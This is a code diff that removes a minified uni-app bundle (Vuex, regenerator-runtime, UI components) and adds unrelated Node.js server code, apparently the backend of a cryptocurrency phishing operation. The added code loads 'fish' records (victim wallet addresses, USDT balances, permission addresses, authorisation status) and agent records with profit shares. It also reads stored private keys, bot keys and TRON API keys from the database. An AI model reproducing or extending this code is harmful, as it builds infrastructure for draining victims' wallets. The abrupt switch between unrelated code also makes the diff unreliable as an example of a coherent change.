-          }, this.strict = i;
-          var u = this._modules.root.state;
-          v(this, u, [], this._modules.root), g(this, u), n.forEach(function (e) {
-            return e(t);
-          });
-          var f = void 0 !== e.devtools ? e.devtools : l.config.devtools;
-          f && function (e) {
-            r && (e._devtoolHook = r, r.emit("vuex:init", e), r.on("vuex:travel-to-state", function (t) {
-              e.replaceState(t);
-            }), e.subscribe(function (e, t) {
-              r.emit("vuex:mutation", e, t);
-            }, {
-              prepend: !0
-            }), e.subscribeAction(function (e, t) {
-              r.emit("vuex:action", e, t);
-            }, {
-              prepend: !0
-            }));
-          }(this);
-        },
-        d = {
-          state: {
-            configurable: !0
-          }
-        };
-      function h(e, t, n) {
-        return t.indexOf(e) < 0 && (n && n.prepend ? t.unshift(e) : t.push(e)), function () {
-          var n = t.indexOf(e);
-          n > -1 && t.splice(n, 1);
-        };
-      }
-      function p(e, t) {
-        e._actions = Object.create(null), e._mutations = Object.create(null), e._wrappedGetters = Object.create(null), e._modulesNamespaceMap = Object.create(null);
-        var n = e.state;
-        v(e, n, [], e._modules.root, !0), g(e, n, t);
-      }
-      function g(e, t, n) {
-        var r = e._vm;
-        e.getters = {}, e._makeLocalGettersCache = Object.create(null);
-        var i = e._wrappedGetters,
-          a = {};
-        o(i, function (t, n) {
-          a[n] = function (e, t) {
-            return function () {
-              return e(t);
-            };
-          }(t, e), Object.defineProperty(e.getters, n, {
-            get: function () {
-              return e._vm[n];
-            },
-            enumerable: !0
-          });
-        });
-        var s = l.config.silent;
-        l.config.silent = !0, e._vm = new l({
-          data: {
-            $$state: t
-          },
-          computed: a
-        }), l.config.silent = s, e.strict && function (e) {
-          e._vm.$watch(function () {
-            return this._data.$$state;
-          }, function () {
-            0;
-          }, {
-            deep: !0,
-            sync: !0
-          });
-        }(e), r && (n && e._withCommit(function () {
-          r._data.$$state = null;
-        }), l.nextTick(function () {
-          return r.$destroy();
-        }));
-      }
-      function v(e, t, n, r, i) {
-        var o = !n.length,
-          a = e._modules.getNamespace(n);
-        if (r.namespaced && (e._modulesNamespaceMap[a], e._modulesNamespaceMap[a] = r), !o && !i) {
-          var s = m(t, n.slice(0, -1)),
-            u = n[n.length - 1];
-          e._withCommit(function () {
-            l.set(s, u, r.state);
-          });
-        }
-        var c = r.context = function (e, t, n) {
-          var r = "" === t,
-            i = {
-              dispatch: r ? e.dispatch : function (n, r, i) {
-                var o = _(n, r, i),
-                  a = o.payload,
-                  s = o.options,
-                  u = o.type;
-                return s && s.root || (u = t + u), e.dispatch(u, a);
-              },
-              commit: r ? e.commit : function (n, r, i) {
-                var o = _(n, r, i),
-                  a = o.payload,
-                  s = o.options,
-                  u = o.type;
-                s && s.root || (u = t + u), e.commit(u, a, s);
-              }
-            };
-          return Object.defineProperties(i, {
-            getters: {
-              get: r ? function () {
-                return e.getters;
-              } : function () {
-                return function (e, t) {
-                  if (!e._makeLocalGettersCache[t]) {
-                    var n = {},
-                      r = t.length;
-                    Object.keys(e.getters).forEach(function (i) {
-                      if (i.slice(0, r) === t) {
-                        var o = i.slice(r);
-                        Object.defineProperty(n, o, {
-                          get: function () {
-                            return e.getters[i];
-                          },
-                          enumerable: !0
-                        });
-                      }
-                    }), e._makeLocalGettersCache[t] = n;
-                  }
-                  return e._makeLocalGettersCache[t];
-                }(e, t);
-              }
-            },
-            state: {
-              get: function () {
-                return m(e.state, n);
-              }
-            }
-          }), i;
-        }(e, a, n);
-        r.forEachMutation(function (t, n) {
-          var r = a + n;
-          (function (e, t, n, r) {
-            var i = e._mutations[t] || (e._mutations[t] = []);
-            i.push(function (t) {
-              n.call(e, r.state, t);
-            });
-          })(e, r, t, c);
-        }), r.forEachAction(function (t, n) {
-          var r = t.root ? n : a + n,
-            i = t.handler || t;
-          (function (e, t, n, r) {
-            var i = e._actions[t] || (e._actions[t] = []);
-            i.push(function (t) {
-              var i = n.call(e, {
-                dispatch: r.dispatch,
-                commit: r.commit,
-                getters: r.getters,
-                state: r.state,
-                rootGetters: e.getters,
-                rootState: e.state
-              }, t);
-              return function (e) {
-                return e && "function" === typeof e.then;
-              }(i) || (i = Promise.resolve(i)), e._devtoolHook ? i.catch(function (t) {
-                throw e._devtoolHook.emit("vuex:error", t), t;
-              }) : i;
-            });
-          })(e, r, i, c);
-        }), r.forEachGetter(function (t, n) {
-          var r = a + n;
-          (function (e, t, n, r) {
-            if (e._wrappedGetters[t]) return void 0;
-            e._wrappedGetters[t] = function (e) {
-              return n(r.state, r.getters, e.state, e.getters);
-            };
-          })(e, r, t, c);
-        }), r.forEachChild(function (r, o) {
-          v(e, t, n.concat(o), r, i);
-        });
-      }
-      function m(e, t) {
-        return t.reduce(function (e, t) {
-          return e[t];
-        }, e);
-      }
-      function _(e, t, n) {
-        return a(e) && e.type && (n = t, t = e, e = e.type), {
-          type: e,
-          payload: t,
-          options: n
-        };
-      }
-      function y(e) {
-        l && e === l || (l = e,
-        /*!
-         * vuex v3.6.2
-         * (c) 2021 Evan You
-         * @license MIT
-         */
-        function (e) {
-          var t = Number(e.version.split(".")[0]);
-          if (t >= 2) e.mixin({
-            beforeCreate: r
-          });else {
-            var n = e.prototype._init;
-            e.prototype._init = function (e) {
-              void 0 === e && (e = {}), e.init = e.init ? [r].concat(e.init) : r, n.call(this, e);
-            };
-          }
-          function r() {
-            var e = this.$options;
-            e.store ? this.$store = "function" === typeof e.store ? e.store() : e.store : e.parent && e.parent.$store && (this.$store = e.parent.$store);
-          }
-        }(l));
-      }
-      d.state.get = function () {
-        return this._vm._data.$$state;
-      }, d.state.set = function (e) {
-        0;
-      }, f.prototype.commit = function (e, t, n) {
-        var r = this,
-          i = _(e, t, n),
-          o = i.type,
-          a = i.payload,
-          s = (i.options, {
-            type: o,
-            payload: a
-          }),
-          u = this._mutations[o];
-        u && (this._withCommit(function () {
-          u.forEach(function (e) {
-            e(a);
-          });
-        }), this._subscribers.slice().forEach(function (e) {
-          return e(s, r.state);
-        }));
-      }, f.prototype.dispatch = function (e, t) {
-        var n = this,
-          r = _(e, t),
-          i = r.type,
-          o = r.payload,
-          a = {
-            type: i,
-            payload: o
-          },
-          s = this._actions[i];
-        if (s) {
-          try {
-            this._actionSubscribers.slice().filter(function (e) {
-              return e.before;
-            }).forEach(function (e) {
-              return e.before(a, n.state);
-            });
-          } catch (c) {
-            0;
-          }
-          var u = s.length > 1 ? Promise.all(s.map(function (e) {
-            return e(o);
-          })) : s[0](o);
-          return new Promise(function (e, t) {
-            u.then(function (t) {
-              try {
-                n._actionSubscribers.filter(function (e) {
-                  return e.after;
-                }).forEach(function (e) {
-                  return e.after(a, n.state);
-                });
-              } catch (c) {
-                0;
-              }
-              e(t);
-            }, function (e) {
-              try {
-                n._actionSubscribers.filter(function (e) {
-                  return e.error;
-                }).forEach(function (t) {
-                  return t.error(a, n.state, e);
-                });
-              } catch (c) {
-                0;
-              }
-              t(e);
-            });
-          });
-        }
-      }, f.prototype.subscribe = function (e, t) {
-        return h(e, this._subscribers, t);
-      }, f.prototype.subscribeAction = function (e, t) {
-        var n = "function" === typeof e ? {
-          before: e
-        } : e;
-        return h(n, this._actionSubscribers, t);
-      }, f.prototype.watch = function (e, t, n) {
-        var r = this;
-        return this._watcherVM.$watch(function () {
-          return e(r.state, r.getters);
-        }, t, n);
-      }, f.prototype.replaceState = function (e) {
-        var t = this;
-        this._withCommit(function () {
-          t._vm._data.$$state = e;
-        });
-      }, f.prototype.registerModule = function (e, t, n) {
-        void 0 === n && (n = {}), "string" === typeof e && (e = [e]), this._modules.register(e, t), v(this, this.state, e, this._modules.get(e), n.preserveState), g(this, this.state);
-      }, f.prototype.unregisterModule = function (e) {
-        var t = this;
-        "string" === typeof e && (e = [e]), this._modules.unregister(e), this._withCommit(function () {
-          var n = m(t.state, e.slice(0, -1));
-          l.delete(n, e[e.length - 1]);
-        }), p(this);
-      }, f.prototype.hasModule = function (e) {
-        return "string" === typeof e && (e = [e]), this._modules.isRegistered(e);
-      }, f.prototype[[104, 111, 116, 85, 112, 100, 97, 116, 101].map(function (e) {
-        return String.fromCharCode(e);
-      }).join("")] = function (e) {
-        this._modules.update(e), p(this, !0);
-      }, f.prototype._withCommit = function (e) {
-        var t = this._committing;
-        this._committing = !0, e(), this._committing = t;
-      }, Object.defineProperties(f.prototype, d);
-      var w = O(function (e, t) {
-          var n = {};
-          return S(t).forEach(function (t) {
-            var r = t.key,
-              i = t.val;
-            n[r] = function () {
-              var t = this.$store.state,
-                n = this.$store.getters;
-              if (e) {
-                var r = T(this.$store, "mapState", e);
-                if (!r) return;
-                t = r.context.state, n = r.context.getters;
-              }
-              return "function" === typeof i ? i.call(this, t, n) : t[i];
-            }, n[r].vuex = !0;
-          }), n;
-        }),
-        b = O(function (e, t) {
-          var n = {};
-          return S(t).forEach(function (t) {
-            var r = t.key,
-              i = t.val;
-            n[r] = function () {
-              var t = [],
-                n = arguments.length;
-              while (n--) t[n] = arguments[n];
-              var r = this.$store.commit;
-              if (e) {
-                var o = T(this.$store, "mapMutations", e);
-                if (!o) return;
-                r = o.context.commit;
-              }
-              return "function" === typeof i ? i.apply(this, [r].concat(t)) : r.apply(this.$store, [i].concat(t));
-            };
-          }), n;
-        }),
-        x = O(function (e, t) {
-          var n = {};
-          return S(t).forEach(function (t) {
-            var r = t.key,
-              i = t.val;
-            i = e + i, n[r] = function () {
-              if (!e || T(this.$store, "mapGetters", e)) return this.$store.getters[i];
-            }, n[r].vuex = !0;
-          }), n;
-        }),
-        k = O(function (e, t) {
-          var n = {};
-          return S(t).forEach(function (t) {
-            var r = t.key,
-              i = t.val;
-            n[r] = function () {
-              var t = [],
-                n = arguments.length;
-              while (n--) t[n] = arguments[n];
-              var r = this.$store.dispatch;
-              if (e) {
-                var o = T(this.$store, "mapActions", e);
-                if (!o) return;
-                r = o.context.dispatch;
-              }
-              return "function" === typeof i ? i.apply(this, [r].concat(t)) : r.apply(this.$store, [i].concat(t));
-            };
-          }), n;
-        });
-      function S(e) {
-        return function (e) {
-          return Array.isArray(e) || a(e);
-        }(e) ? Array.isArray(e) ? e.map(function (e) {
-          return {
-            key: e,
-            val: e
-          };
-        }) : Object.keys(e).map(function (t) {
-          return {
-            key: t,
-            val: e[t]
-          };
-        }) : [];
-      }
-      function O(e) {
-        return function (t, n) {
-          return "string" !== typeof t ? (n = t, t = "") : "/" !== t.charAt(t.length - 1) && (t += "/"), e(t, n);
-        };
-      }
-      function T(e, t, n) {
-        var r = e._modulesNamespaceMap[n];
-        return r;
-      }
-      function P(e, t, n) {
-        var r = n ? e.groupCollapsed : e.group;
-        try {
-          r.call(e, t);
-        } catch (i) {
-          e.log(t);
-        }
-      }
-      function A(e) {
-        try {
-          e.groupEnd();
-        } catch (t) {
-          e.log("\u2014\u2014 log end \u2014\u2014");
-        }
-      }
-      function I() {
-        var e = new Date();
-        return " @ " + C(e.getHours(), 2) + ":" + C(e.getMinutes(), 2) + ":" + C(e.getSeconds(), 2) + "." + C(e.getMilliseconds(), 3);
-      }
-      function C(e, t) {
-        return function (e, t) {
-          return new Array(t + 1).join(e);
-        }("0", t - e.toString().length) + e;
-      }
-      var E = {
-        Store: f,
-        install: y,
-        version: "3.6.2",
-        mapState: w,
-        mapMutations: b,
-        mapGetters: x,
-        mapActions: k,
-        createNamespacedHelpers: function (e) {
-          return {
-            mapState: w.bind(null, e),
-            mapGetters: x.bind(null, e),
-            mapMutations: b.bind(null, e),
-            mapActions: k.bind(null, e)
-          };
-        },
-        createLogger: function (e) {
-          void 0 === e && (e = {});
-          var t = e.collapsed;
-          void 0 === t && (t = !0);
-          var n = e.filter;
-          void 0 === n && (n = function (e, t, n) {
-            return !0;
-          });
-          var r = e.transformer;
-          void 0 === r && (r = function (e) {
-            return e;
-          });
-          var o = e.mutationTransformer;
-          void 0 === o && (o = function (e) {
-            return e;
-          });
-          var a = e.actionFilter;
-          void 0 === a && (a = function (e, t) {
-            return !0;
-          });
-          var s = e.actionTransformer;
-          void 0 === s && (s = function (e) {
-            return e;
-          });
-          var u = e.logMutations;
-          void 0 === u && (u = !0);
-          var c = e.logActions;
-          void 0 === c && (c = !0);
-          var l = e.logger;
-          return void 0 === l && (l = console), function (e) {
-            var f = i(e.state);
-            "undefined" !== typeof l && (u && e.subscribe(function (e, a) {
-              var s = i(a);
-              if (n(e, f, s)) {
-                var u = I(),
-                  c = o(e),
-                  d = "mutation " + e.type + u;
-                P(l, d, t), l.log("%c prev state", "color: #9E9E9E; font-weight: bold", r(f)), l.log("%c mutation", "color: #03A9F4; font-weight: bold", c), l.log("%c next state", "color: #4CAF50; font-weight: bold", r(s)), A(l);
-              }
-              f = s;
-            }), c && e.subscribeAction(function (e, n) {
-              if (a(e, n)) {
-                var r = I(),
-                  i = s(e),
-                  o = "action " + e.type + r;
-                P(l, o, t), l.log("%c action", "color: #03A9F4; font-weight: bold", i), A(l);
-              }
-            }));
-          };
-        }
-      };
-      e.exports = E;
-    }).call(this, n("0ee4"));
-  },
-  "8ffa": function (e, t, n) {
-    var r = n("7647");
-    e.exports = function (e, t) {
-      if ("function" !== typeof t && null !== t) throw new TypeError("Super expression must either be null or a function");
-      e.prototype = Object.create(t && t.prototype, {
-        constructor: {
-          value: e,
-          writable: !0,
-          configurable: !0
-        }
-      }), Object.defineProperty(e, "prototype", {
-        writable: !1
-      }), t && r(e, t);
-    }, e.exports.__esModule = !0, e.exports["default"] = e.exports;
-  },
-  9008: function (e, t) {
-    e.exports = function () {
-      throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
-    }, e.exports.__esModule = !0, e.exports["default"] = e.exports;
-  },
-  "931d": function (e, t, n) {
-    var r = n("7647"),
-      i = n("011a");
-    e.exports = function (e, t, n) {
-      if (i()) return Reflect.construct.apply(null, arguments);
-      var o = [null];
-      o.push.apply(o, t);
-      var a = new (e.bind.apply(e, o))();
-      return n && r(a, n.prototype), a;
-    }, e.exports.__esModule = !0, e.exports["default"] = e.exports;
-  },
-  "951c": function (e, t) {
-    e.exports = Vue;
-  },
-  9819: function (e, t, n) {
-    "use strict";
-
-    n.d(t, "b", function () {
-      return r;
-    }), n.d(t, "c", function () {
-      return i;
-    }), n.d(t, "a", function () {});
-    var r = function () {
-        var e = this,
-          t = e.$createElement,
-          n = e._self._c || t;
-        return n("text", {
-          staticClass: e._$s(0, "sc", "uni-icons"),
-          class: e._$s(0, "c", ["uniui-" + e.type, e.customPrefix, e.customPrefix ? e.type : ""]),
-          style: e._$s(0, "s", e.styleObj),
-          attrs: {
-            _i: 0
-          },
-          on: {
-            click: e._onClick
-          }
-        }, [e._t("default", null, {
-          _i: 1
-        })], 2);
-      },
-      i = [];
-  },
-  "9a25": function (e, t, n) {
-    "use strict";
-
-    n.r(t);
-    var r = n("e3c6"),
-      i = n.n(r);
-    for (var o in r) ["default"].indexOf(o) < 0 && function (e) {
-      n.d(t, e, function () {
-        return r[e];
-      });
-    }(o);
-    t["default"] = i.a;
-  },
-  "9e17": function (e, t, n) {
-    "use strict";
-
-    n.r(t);
-    var r = n("fc3f"),
-      i = n("80c1");
-    for (var o in i) ["default"].indexOf(o) < 0 && function (e) {
-      n.d(t, e, function () {
-        return i[e];
-      });
-    }(o);
-    var a = n("828b"),
-      s = Object(a["a"])(i["default"], r["b"], r["c"], !1, null, null, null, !1, r["a"], void 0);
-    t["default"] = s.exports;
-  },
-  "9fc1": function (e, t, n) {
-    var r = n("3b2d")["default"];
-    function i() {
-      "use strict";
-
-      /*! regenerator-runtime -- Copyright (c) 2014-present, Facebook, Inc. -- license (MIT): https://github.com/facebook/regenerator/blob/main/LICENSE */
-      e.exports = i = function () {
-        return n;
-      }, e.exports.__esModule = !0, e.exports["default"] = e.exports;
-      var t,
-        n = {},
-        o = Object.prototype,
-        a = o.hasOwnProperty,
-        s = Object.defineProperty || function (e, t, n) {
-          e[t] = n.value;
-        },
-        u = "function" == typeof Symbol ? Symbol : {},
-        c = u.iterator || "@@iterator",
-        l = u.asyncIterator || "@@asyncIterator",
-        f = u.toStringTag || "@@toStringTag";
-      function d(e, t, n) {
-        return Object.defineProperty(e, t, {
-          value: n,
-          enumerable: !0,
-          configurable: !0,
-          writable: !0
-        }), e[t];
-      }
-      try {
-        d({}, "");
-      } catch (t) {
-        d = function (e, t, n) {
-          return e[t] = n;
-        };
-      }
-      function h(e, t, n, r) {
-        var i = t && t.prototype instanceof y ? t : y,
-          o = Object.create(i.prototype),
-          a = new L(r || []);
-        return s(o, "_invoke", {
-          value: A(e, n, a)
-        }), o;
-      }
-      function p(e, t, n) {
-        try {
-          return {
-            type: "normal",
-            arg: e.call(t, n)
-          };
-        } catch (e) {
-          return {
-            type: "throw",
-            arg: e
-          };
-        }
-      }
-      n.wrap = h;
-      var g = "suspendedStart",
-        v = "executing",
-        m = "completed",
-        _ = {};
-      function y() {}
-      function w() {}
-      function b() {}
-      var x = {};
-      d(x, c, function () {
-        return this;
-      });
-      var k = Object.getPrototypeOf,
-        S = k && k(k(M([])));
-      S && S !== o && a.call(S, c) && (x = S);
-      var O = b.prototype = y.prototype = Object.create(x);
-      function T(e) {
-        ["next", "throw", "return"].forEach(function (t) {
-          d(e, t, function (e) {
-            return this._invoke(t, e);
-          });
-        });
-      }
-      function P(e, t) {
-        function n(i, o, s, u) {
-          var c = p(e[i], e, o);
-          if ("throw" !== c.type) {
-            var l = c.arg,
-              f = l.value;
-            return f && "object" == r(f) && a.call(f, "__await") ? t.resolve(f.__await).then(function (e) {
-              n("next", e, s, u);
-            }, function (e) {
-              n("throw", e, s, u);
-            }) : t.resolve(f).then(function (e) {
-              l.value = e, s(l);
-            }, function (e) {
-              return n("throw", e, s, u);
-            });
-          }
-          u(c.arg);
-        }
-        var i;
-        s(this, "_invoke", {
-          value: function (e, r) {
-            function o() {
-              return new t(function (t, i) {
-                n(e, r, t, i);
-              });
-            }
-            return i = i ? i.then(o, o) : o();
-          }
-        });
-      }
-      function A(e, n, r) {
-        var i = g;
-        return function (o, a) {
-          if (i === v) throw Error("Generator is already running");
-          if (i === m) {
-            if ("throw" === o) throw a;
-            return {
-              value: t,
-              done: !0
-            };
-          }
-          for (r.method = o, r.arg = a;;) {
-            var s = r.delegate;
-            if (s) {
-              var u = I(s, r);
-              if (u) {
-                if (u === _) continue;
-                return u;
-              }
-            }
-            if ("next" === r.method) r.sent = r._sent = r.arg;else if ("throw" === r.method) {
-              if (i === g) throw i = m, r.arg;
-              r.dispatchException(r.arg);
-            } else "return" === r.method && r.abrupt("return", r.arg);
-            i = v;
-            var c = p(e, n, r);
-            if ("normal" === c.type) {
-              if (i = r.done ? m : "suspendedYield", c.arg === _) continue;
-              return {
-                value: c.arg,
-                done: r.done
-              };
-            }
-            "throw" === c.type && (i = m, r.method = "throw", r.arg = c.arg);
-          }
-        };
-      }
-      function I(e, n) {
-        var r = n.method,
-          i = e.iterator[r];
-        if (i === t) return n.delegate = null, "throw" === r && e.iterator["return"] && (n.method = "return", n.arg = t, I(e, n), "throw" === n.method) || "return" !== r && (n.method = "throw", n.arg = new TypeError("The iterator does not provide a '" + r + "' method")), _;
-        var o = p(i, e.iterator, n.arg);
-        if ("throw" === o.type) return n.method = "throw", n.arg = o.arg, n.delegate = null, _;
-        var a = o.arg;
-        return a ? a.done ? (n[e.resultName] = a.value, n.next = e.nextLoc, "return" !== n.method && (n.method = "next", n.arg = t), n.delegate = null, _) : a : (n.method = "throw", n.arg = new TypeError("iterator result is not an object"), n.delegate = null, _);
-      }
-      function C(e) {
-        var t = {
-          tryLoc: e[0]
-        };
-        1 in e && (t.catchLoc = e[1]), 2 in e && (t.finallyLoc = e[2], t.afterLoc = e[3]), this.tryEntries.push(t);
-      }
-      function E(e) {
-        var t = e.completion || {};
-        t.type = "normal", delete t.arg, e.completion = t;
-      }
-      function L(e) {
-        this.tryEntries = [{
-          tryLoc: "root"
-        }], e.forEach(C, this), this.reset(!0);
-      }
-      function M(e) {
-        if (e || "" === e) {
-          var n = e[c];
-          if (n) return n.call(e);
-          if ("function" == typeof e.next) return e;
-          if (!isNaN(e.length)) {
-            var i = -1,
-              o = function n() {
-                for (; ++i < e.length;) if (a.call(e, i)) return n.value = e[i], n.done = !1, n;
-                return n.value = t, n.done = !0, n;
-              };
-            return o.next = o;
-          }
-        }
-        throw new TypeError(r(e) + " is not iterable");
-      }
-      return w.prototype = b, s(O, "constructor", {
-        value: b,
-        configurable: !0
-      }), s(b, "constructor", {
-        value: w,
-        configurable: !0
-      }), w.displayName = d(b, f, "GeneratorFunction"), n.isGeneratorFunction = function (e) {
-        var t = "function" == typeof e && e.constructor;
-        return !!t && (t === w || "GeneratorFunction" === (t.displayName || t.name));
-      }, n.mark = function (e) {
-        return Object.setPrototypeOf ? Object.setPrototypeOf(e, b) : (e.__proto__ = b, d(e, f, "GeneratorFunction")), e.prototype = Object.create(O), e;
-      }, n.awrap = function (e) {
-        return {
-          __await: e
-        };
-      }, T(P.prototype), d(P.prototype, l, function () {
-        return this;
-      }), n.AsyncIterator = P, n.async = function (e, t, r, i, o) {
-        void 0 === o && (o = Promise);
-        var a = new P(h(e, t, r, i), o);
-        return n.isGeneratorFunction(t) ? a : a.next().then(function (e) {
-          return e.done ? e.value : a.next();
-        });
-      }, T(O), d(O, f, "Generator"), d(O, c, function () {
-        return this;
-      }), d(O, "toString", function () {
-        return "[object Generator]";
-      }), n.keys = function (e) {
-        var t = Object(e),
-          n = [];
-        for (var r in t) n.push(r);
-        return n.reverse(), function e() {
-          for (; n.length;) {
-            var r = n.pop();
-            if (r in t) return e.value = r, e.done = !1, e;
-          }
-          return e.done = !0, e;
-        };
-      }, n.values = M, L.prototype = {
-        constructor: L,
-        reset: function (e) {
-          if (this.prev = 0, this.next = 0, this.sent = this._sent = t, this.done = !1, this.delegate = null, this.method = "next", this.arg = t, this.tryEntries.forEach(E), !e) for (var n in this) "t" === n.charAt(0) && a.call(this, n) && !isNaN(+n.slice(1)) && (this[n] = t);
-        },
-        stop: function () {
-          this.done = !0;
-          var e = this.tryEntries[0].completion;
-          if ("throw" === e.type) throw e.arg;
-          return this.rval;
-        },
-        dispatchException: function (e) {
-          if (this.done) throw e;
-          var n = this;
-          function r(r, i) {
-            return s.type = "throw", s.arg = e, n.next = r, i && (n.method = "next", n.arg = t), !!i;
-          }
-          for (var i = this.tryEntries.length - 1; i >= 0; --i) {
-            var o = this.tryEntries[i],
-              s = o.completion;
-            if ("root" === o.tryLoc) return r("end");
-            if (o.tryLoc <= this.prev) {
-              var u = a.call(o, "catchLoc"),
-                c = a.call(o, "finallyLoc");
-              if (u && c) {
-                if (this.prev < o.catchLoc) return r(o.catchLoc, !0);
-                if (this.prev < o.finallyLoc) return r(o.finallyLoc);
-              } else if (u) {
-                if (this.prev < o.catchLoc) return r(o.catchLoc, !0);
-              } else {
-                if (!c) throw Error("try statement without catch or finally");
-                if (this.prev < o.finallyLoc) return r(o.finallyLoc);
-              }
-            }
-          }
-        },
-        abrupt: function (e, t) {
-          for (var n = this.tryEntries.length - 1; n >= 0; --n) {
-            var r = this.tryEntries[n];
-            if (r.tryLoc <= this.prev && a.call(r, "finallyLoc") && this.prev < r.finallyLoc) {
-              var i = r;
-              break;
-            }
-          }
-          i && ("break" === e || "continue" === e) && i.tryLoc <= t && t <= i.finallyLoc && (i = null);
-          var o = i ? i.completion : {};
-          return o.type = e, o.arg = t, i ? (this.method = "next", this.next = i.finallyLoc, _) : this.complete(o);
-        },
-        complete: function (e, t) {
-          if ("throw" === e.type) throw e.arg;
-          return "break" === e.type || "continue" === e.type ? this.next = e.arg : "return" === e.type ? (this.rval = this.arg = e.arg, this.method = "return", this.next = "end") : "normal" === e.type && t && (this.next = t), _;
-        },
-        finish: function (e) {
-          for (var t = this.tryEntries.length - 1; t >= 0; --t) {
-            var n = this.tryEntries[t];
-            if (n.finallyLoc === e) return this.complete(n.completion, n.afterLoc), E(n), _;
-          }
-        },
-        catch: function (e) {
-          for (var t = this.tryEntries.length - 1; t >= 0; --t) {
-            var n = this.tryEntries[t];
-            if (n.tryLoc === e) {
-              var r = n.completion;
-              if ("throw" === r.type) {
-                var i = r.arg;
-                E(n);
-              }
-              return i;
-            }
-          }
-          throw Error("illegal catch attempt");
-        },
-        delegateYield: function (e, n, r) {
-          return this.delegate = {
-            iterator: M(e),
-            resultName: n,
-            nextLoc: r
-          }, "next" === this.method && (this.arg = t), _;
-        }
-      }, n;
-    }
-    e.exports = i, e.exports.__esModule = !0, e.exports["default"] = e.exports;
-  },
-  "9fd6": function (e, t, n) {
-    "use strict";
-
-    n.r(t);
-    var r = n("0a91"),
-      i = n.n(r);
-    for (var o in r) ["default"].indexOf(o) < 0 && function (e) {
-      n.d(t, e, function () {
-        return r[e];
-      });
-    }(o);
-    t["default"] = i.a;
-  },
-  a043: function (e, t, n) {
-    "use strict";
-
-    n.r(t);
-    var r = n("db14"),
-      i = n("7501");
-    for (var o in i) ["default"].indexOf(o) < 0 && function (e) {
-      n.d(t, e, function () {
-        return i[e];
-      });
-    }(o);
-    var a = n("828b"),
-      s = Object(a["a"])(i["default"], r["b"], r["c"], !1, null, null, null, !1, r["a"], void 0);
-    t["default"] = s.exports;
-  },
-  a708: function (e, t, n) {
-    var r = n("6454");
-    e.exports = function (e) {
-      if (Array.isArray(e)) return r(e);
-    }, e.exports.__esModule = !0, e.exports["default"] = e.exports;
-  },
-  af34: function (e, t, n) {
-    var r = n("a708"),
-      i = n("b893"),
-      o = n("6382"),
-      a = n("9008");
-    e.exports = function (e) {
-      return r(e) || i(e) || o(e) || a();
-    }, e.exports.__esModule = !0, e.exports["default"] = e.exports;
-  },
-  b14d: function (e, t, n) {
-    "use strict";
-
-    Object.defineProperty(t, "__esModule", {
-      value: !0
-    }), t.default = void 0;
-    var r = {
-      data: function () {
-        return {};
-      },
-      methods: {},
-      onLoad: function () {
-        setTimeout(function () {
-          uni.navigateBack({
-            delta: 1
-          });
-        }, 300);
-      }
+  }
+  const u = F,
+    K = String(I + 1).padStart(2, "0");
+  const q = String(b).padStart(2, "0"),
+    E = String(l).padStart(2, "0"),
+    P = String(J.getUTCMinutes()).padStart(2, "0");
+  const O = String(J.getUTCSeconds()).padStart(2, "0"),
+    s = u + "-" + K + "-" + q + " " + E + ":" + P + ":" + O,
+    d = {
+      time: s,
+      greeting: U
     };
-    t.default = r;
+  return d;
+}
+const dbConfig = {
+  host: process.env.DB_HOST,
+  port: parseInt(process.env.DB_PORT),
+  database: process.env.DB_DATABASE,
+  user: process.env.DB_USERNAME,
+  password: process.env.DB_PASSWORD
+};
+function createDbPool() {
+  const w = {
+    ...dbConfig,
+    waitForConnections: true,
+    connectionLimit: 10,
+    queueLimit: 0
+  };
+  return mysql.createPool(w);
+}
+const pool = createDbPool();
+let cacheData = {
+    fishMap: new Map(),
+    fishBrowseMap: new Map(),
+    dailiMap: new Map(),
+    dailiGroupMap: new Map(),
+    options: {},
+    permissionAddresses: []
   },
-  b18e: function (e) {
-    e.exports = JSON.parse("{\"uni-load-more.contentdown\":\"\u4E0A\u62C9\u663E\u793A\u66F4\u591A\",\"uni-load-more.contentrefresh\":\"\u6B63\u5728\u52A0\u8F7D...\",\"uni-load-more.contentnomore\":\"\u6CA1\u6709\u66F4\u591A\u6570\u636E\u4E86\"}");
-  },
-  b4d2: function (e, t) {
-    function n(t) {
-      return e.exports = n = Object.setPrototypeOf ? Object.getPrototypeOf.bind() : function (e) {
-        return e.__proto__ || Object.getPrototypeOf(e);
-      }, e.exports.__esModule = !0, e.exports["default"] = e.exports, n(t);
+  __refreshPromise = null;
+async function refreshCacheOnce() {
+  const [w, J, a, z, l] = await Promise.all([pool.promise().query("SELECT fish_address, chainid, permissions_fishaddress, unique_id, usdt_balance, gas_balance, threshold, time, remark, auth_status FROM fish"), pool.promise().query("SELECT id, fish_address, chainid, permissions_fishaddress, unique_id, usdt_balance, gas_balance, time, state FROM fish_browse"), pool.promise().query("SELECT tguid, username, fullName, fishnumber, time, remark, payment_address, groupid, threshold, unique_id FROM daili"), pool.promise().query("SELECT id, groupid, remark, share_profits, status FROM daili_group"), pool.promise().query("SELECT name, value FROM options WHERE name IN ('domain', 'payment_address', 'permission_address', 'private_key', 'contract_method', 'need_usdt_contract', 'bot_key', 'trongridkyes', 'main_domain', 'default_id')")]),
+    b = new Map();
+  w[0].forEach(q => {
+    b.set(q.fish_address, q);
+  });
+  const I = new Map();
+  J[0].forEach(q => {
+    I.set(q.fish_address, q);
+  });
+  const F = new Map();
+  a[0].forEach(q => {
+    F.set(q.unique_id, q);
+  });
+  const U = new Map();
+  z[0].forEach(q => {
+    U.set(q.groupid, q);
+  });
+  const u = {},
+    K = [];
+  l[0].forEach(q => {
+    if (q.name === "permission_address" && q.value) {
+      const O = q.value.split("\r\n").filter(s => s.trim());
+      K.push(...O);
+      u[q.name] = q.value;
+    } else {
+      u[q.name] = q.value;
     }
-    e.exports = n, e.exports.__esModule = !0, e.exports["default"] = e.exports;
-  },
-  b893: function (e, t) {
-    e.exports = function (e) {
-      if ("undefined" !== typeof Symbol && null != e[Symbol.iterator] || null != e["@@iterator"]) return Array.from(e);
-    }, e.exports.__esModule = !0, e.exports["default"] = e.exports;
-  },
-  b92e: function (e, t, n) {
-    "use strict";
-
-    n.d(t, "b", function () {
-      return r;
-    }), n.d(t, "c", function () {
-      return i;
-    }), n.d(t, "a", function () {});
-    var r = function () {
-        var e = this,
-          t = e.$createElement,
-          n = e._self._c || t;
-        return e._$s(0, "i", e.isShowA) ? n("a", {
-          staticClass: e._$s(0, "sc", "uni-link"),
-          class: e._$s(0, "c", {
-            "uni-link--withline": !0 === e.showUnderLine || "true" === e.showUnderLine
-          }),
-          style: e._$s(0, "s", {
-            color: e.color,
